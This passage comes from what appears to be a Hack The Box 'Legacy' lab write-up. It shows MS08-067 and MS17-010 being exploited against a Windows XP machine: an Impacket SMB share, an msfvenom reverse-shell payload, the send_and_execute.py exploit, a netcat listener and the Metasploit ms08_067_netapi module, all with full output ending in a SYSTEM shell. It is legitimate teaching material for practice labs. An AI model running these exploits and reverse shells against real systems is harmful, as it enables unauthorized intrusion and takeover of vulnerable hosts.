<p>We can use <code class="language-plaintext highlighter-rouge">whoami.exe</code> which is by default available on kali OS inside <code class="language-plaintext highlighter-rouge">/usr/share/windows-binaries</code> and host it on our SMB server using <code class="language-plaintext highlighter-rouge">Impacket's Smbserver</code> and run it on the remote host:</p>

<h3 id="sharing-smb-folder-from-attacking-machine">Sharing SMB folder from attacking machine</h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>cfx:  /usr/share/windows-binaries
â†’ smbserver.py cfx <span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span>
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.4,1039<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>LEGACY<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User LEGACY<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::4141414141414141
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="executing-whomaiexe-binary-on-target-machine">Executing <code class="language-plaintext highlighter-rouge">whomai.exe</code> binary on target machine:</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;<span class="se">\\</span>10.10.14.14<span class="se">\c</span>fx<span class="se">\w</span>hoami.exe
<span class="se">\\</span>10.10.14.14<span class="se">\c</span>fx<span class="se">\w</span>hoami.exe
NT AUTHORITY<span class="se">\S</span>YSTEM
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Hereby we confirm <code class="language-plaintext highlighter-rouge">MS08-67 exploit</code> gave us the shell as <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code></p>

<h2 id="ms17-010">MS17-010</h2>

<p>For MS17-010 exploit, we will use the <a href="https://github.com/helviojunior/MS17-010"><strong>code</strong></a> from <strong>helviojunior</strong> which is a fork from <strong>worawit/MS17-010</strong> repo.</p>

<p>We can download the exploit on our machine using the following command:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>wget https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py
</pre></td></tr></tbody></table></code></pre></div></div>
<p>This exploit is pretty straight forward as it just requires an reverse shell payload file which it uploads &amp; executes on the target machine.</p>

<h3 id="generating-payload-with-msfvenom">Generating payload with MSFvenom</h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/legacy/MS17-010
â†’ msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.14 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> exe <span class="nt">-a</span> x86 <span class="nt">--platform</span> windows <span class="nt">-o</span> cfx.exe
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: cfx.exe
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="exploitation-1">Exploitation</h3>

<p>We will start a <code class="language-plaintext highlighter-rouge">nc</code> listener on port 443 and execute the exploit:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/legacy/MS17-010
â†’ /usr/bin/python2 send_and_execute.py 10.10.10.4 cfx.exe
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x821c8770
SESSION: 0xe19ff010
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct <span class="k">for </span>arbitrary <span class="nb">read</span>/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe19459f0
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe1945a90
overwriting token UserAndGroups
Sending file QCNNC5.exe...
Opening SVCManager on 10.10.10.4.....
Creating service JPzI.....
Starting service JPzI.....
The NETBIOS connection with the remote host timed out.
Removing service JPzI.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
</pre></td></tr></tbody></table></code></pre></div></div>

<p>And as soon as the exploit completes we get a call back on our listener, we can use the same SMB hosted <code class="language-plaintext highlighter-rouge">whomai.exe</code> binary to confirm we are running as system:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/legacy/MS17-010
â†’ nc <span class="nt">-lvnp</span> 443
Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1031.
Microsoft Windows XP <span class="o">[</span>Version 5.1.2600]
<span class="o">(</span>C<span class="o">)</span> Copyright 1985-2001 Microsoft Corp.

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;<span class="se">\\</span>10.10.14.14<span class="se">\c</span>fx<span class="se">\w</span>hoami.exe
<span class="se">\\</span>10.10.14.14<span class="se">\c</span>fx<span class="se">\w</span>hoami.exe
NT AUTHORITY<span class="se">\S</span>YSTEM
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="metasploit">Metasploit</h2>

<p>We can easily own the box using Metasploit, since it has built in exploits for both the vulnerabilities.
Lets run Metasploit using <code class="language-plaintext highlighter-rouge">msfconsole</code> and use <code class="language-plaintext highlighter-rouge">exploit/windows/smb/ms08_067_netapi</code>. Weâ€™ll then set the payload, other parameters and fire up the exploit.</p>

<p>Similar to above two methods, we can verify if we running as system using our <code class="language-plaintext highlighter-rouge">whoami.exe</code> binary.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/legacy/MS17-010
â†’ msfconsole

     ,           ,
    /             <span class="se">\</span>
   <span class="o">((</span>__---,,,---__<span class="o">))</span>
      <span class="o">(</span>_<span class="o">)</span> O O <span class="o">(</span>_<span class="o">)</span>_________
         <span class="se">\ </span>_ /            |<span class="se">\</span>
          o_o <span class="se">\ </span>  M S F   | <span class="se">\</span>
               <span class="se">\ </span>  _____  |  <span class="k">*</span>
                <span class="o">||</span>|   WW|||
                <span class="o">||</span>|     <span class="o">||</span>|


       <span class="o">=[</span> metasploit v5.0.101-dev                         <span class="o">]</span>
+ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 2049 exploits - 1108 auxiliary - 344 post       <span class="o">]</span>
+ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 566 payloads - 45 encoders - 10 nops            <span class="o">]</span>
+ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 7 evasion                                       <span class="o">]</span>

Metasploit tip: Save the current environment with the save <span class="nb">command</span>, future console restarts will use this environment again

msf5 <span class="o">&gt;</span> use exploit/windows/smb/ms08_067_netapi
<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/reverse_tcp
payload <span class="o">=&gt;</span> windows/meterpreter/reverse_tcp
msf5 exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 10.10.10.4
RHOSTS <span class="o">=&gt;</span> 10.10.10.4
msf5 exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 10.10.14.14
LHOST <span class="o">=&gt;</span> 10.10.14.14
msf5 exploit<span class="o">(</span>windows/smb/ms08_067_netapi<span class="o">)</span> <span class="o">&gt;</span> exploit

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.14:4444
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.4:445 - Automatically detecting the target...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.4:445 - Selected Target: Windows XP SP3 English <span class="o">(</span>AlwaysOn NX<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.4:445 - Attempting to trigger the vulnerability...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>176195 bytes<span class="o">)</span> to 10.10.10.4
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.14.14:4444 -&gt; 10.10.10.4:1035<span class="o">)</span> at 2020-09-01 17:53:19 +0530

meterpreter <span class="o">&gt;</span> shell
Process 1344 created.
Channel 1 created.
Microsoft Windows XP <span class="o">[</span>Version 5.1.2600]
<span class="o">(</span>C<span class="o">)</span> Copyright 1985-2001 Microsoft Corp.


C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;<span class="se">\\</span>10.10.14.14<span class="se">\c</span>fx<span class="se">\w</span>hoami.exe
<span class="se">\\</span>10.10.14.14<span class="se">\c</span>fx<span class="se">\w</span>hoami.exe
NT AUTHORITY<span class="se">\S</span>YSTEM
</pre></td></tr></tbody></table></code></pre></div></div>
<p>And we pwned the Box !</p>

<p>Thanks for reading, Feedback is appreciated !</p>
:ET